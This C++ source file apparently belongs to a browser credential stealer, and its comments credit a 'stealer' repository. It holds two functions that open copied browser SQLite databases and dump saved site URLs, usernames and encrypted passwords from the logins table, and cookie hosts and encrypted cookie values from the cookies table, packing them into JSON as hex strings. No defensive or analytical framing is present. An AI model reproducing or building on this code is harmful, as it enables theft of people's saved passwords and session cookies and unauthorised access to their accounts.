#include "SQLfunctions.h"

std::string hexStr(const uint8_t *data, int len)
//https://stackoverflow.com/questions/14050452/how-to-convert-byte-array-to-hex-string-in-visual-c
{
     std::stringstream ss;
     ss << std::hex << std::setfill ('0');

     for( int i(0) ; i < len; ++i )
         ss<<std::setw(2)<<static_cast<int>(data[i]);

     return ss.str();
}

/*gets passwords from temp file*/
json getAllResults(const char * temp){

   sqlite3 *db;
   int db_res;
    //inspired by https://github.com/HlebHatouka/stealer/blob/master/windows/tools.h
   db_res = sqlite3_open(temp, &db);

   if( db_res ) {
      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      return(0);
   } else {
      fprintf(stderr, "Opened database successfully\n");
   }
    std::vector<json> data;
    std::string sql = "SELECT origin_url, username_value, password_value FROM logins";

    std::stringstream dump(std::string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        //dump << "statement failed rc = " << rc;
        return json("HEY YOU SUCK!");
    }

    rc = sqlite3_step(pStmt);
    //std::cout << "RC: " << rc << std::endl;
    while (rc == SQLITE_ROW) 
    {
        json res;
        res["url"] = (char*)sqlite3_column_text(pStmt, 0);
        DATA_BLOB encryptedPass;
        DWORD *d = (DWORD *)malloc(sizeof(DWORD));
        encryptedPass.cbData = *d;
        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
        res["password"] = hexStr(encryptedPass.pbData, encryptedPass.cbData);
        res["username"] = (char *) sqlite3_column_text(pStmt, 1);
        

        free(d);
        free(encryptedPass.pbData);
        rc = sqlite3_step(pStmt);
        data.push_back(res);
    }
    rc = sqlite3_finalize(pStmt);
    sqlite3_close(db);
    return data;

}

/*Gets cookies from temp file*/
json getAllCookies(const char * temp){
    //inspired by https://github.com/HlebHatouka/stealer/blob/master/windows/tools.h

    sqlite3 *db;
   int db_res;

   db_res = sqlite3_open(temp, &db);

   if( db_res ) {
      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      return(0);
   } else {
      fprintf(stderr, "Opened database successfully\n");
   }
    std::vector<json> data;
    std::string sql = "SELECT HOST_KEY, encrypted_value FROM cookies";

    std::stringstream dump(std::string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        dump << "statement failed rc = " << rc;
        return json("HEY YOU SUCK!");
    }

    rc = sqlite3_step(pStmt);
    while (rc == SQLITE_ROW) 
    {   

        json res;
        res["HOST_KEY"] = (char*)sqlite3_column_text(pStmt, 0);

        //res["path"] = (char *) sqlite3_column_text(pStmt, 1);
    
        DATA_BLOB encryptedPass;
        DWORD *d = (DWORD *)malloc(sizeof(DWORD));
        encryptedPass.cbData = *d;
        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 1);
        encryptedPass.pbData = (BYTE *)malloc((int)encryptedPass.cbData);
        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 1), (int)encryptedPass.cbData);
        res["encrypted value"] = hexStr(encryptedPass.pbData, encryptedPass.cbData);
        //free(data);
        //free(encryptedPass.pbData);
        rc = sqlite3_step(pStmt);
        data.push_back(res);
        free(d);
        free(encryptedPass.pbData );
    }
    rc = sqlite3_finalize(pStmt);
    sqlite3_close(db);
    return data;


}
